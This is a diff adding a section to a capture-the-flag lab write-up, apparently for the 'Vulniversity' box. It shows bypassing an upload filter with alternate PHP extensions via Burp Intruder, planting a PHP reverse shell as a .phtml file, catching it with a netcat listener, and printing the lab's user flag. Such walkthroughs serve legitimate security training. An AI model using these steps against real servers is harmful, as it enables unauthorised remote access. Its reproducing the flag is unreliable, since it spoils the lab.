@@ -163,5 +163,55 @@ Try upload a few file types to the server, what common extension seems to be blo
 
 .php
 
+Create a text file 'phpext.txt' with common PHP extensions :
+.php
+.php3
+.php4
+.php5
+.phtml
+
+Start BurpSuite and configure the proxy to intercept the traffic from http://10.10.170.87:3333/internal/
+
+Upload a .php file, capture it in Burp proxy and forward it to the intruder :
+![alt-title](/images/Vulniversity1.png)
+
+Click on 'Payloads' tab and select the 'Sniper' attack :
+![alt-title](/images/Vulniversity2.png)
+
+Then, click on the 'Positions' tab and modify the captured HTTP request like that :
+![alt-title](/images/Vulniversity3.png)
+
+and launch the attack.
+Check the results, by clicking on the 'Response' tab :
+![alt-title](/images/Vulniversity4.png)
+![alt-title](/images/Vulniversity5.png)
+
+Download the following reverse PHP shell [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and replace the line `$ip = '127.0.0.1';  // CHANGE THIS` with the IP of the attack machine.
+
+Save the modified reverse PHP shell to 'php-reverse-shell.phtml' so that it is accepted by the upload form.
+
+Start listening to incoming connections using netcat : nc -lvnp 1234
+
+Upload 'php-reverse-shell.phtml' and navigate to http://<ip>:3333/internal/uploads/php-reverse-shell.phtml
+This will execute the payload and will give a reverse shell :
+![alt-title](/images/Vulniversity6.png)
+  
+#### What is the name of the user who manages the webserver ?
+  
+> whoami
+> www-data
+> 
+> pwd
+> /
+> dir /home
+> bill
+> 
+> dir /home/bill
+> user.txt
+> 
+> cat /home/bill/user.txt
+> 8bd7992fbe8a6ad22a63361004cfcedb
+
+
 ## Task 5 : Privilege escalation
 
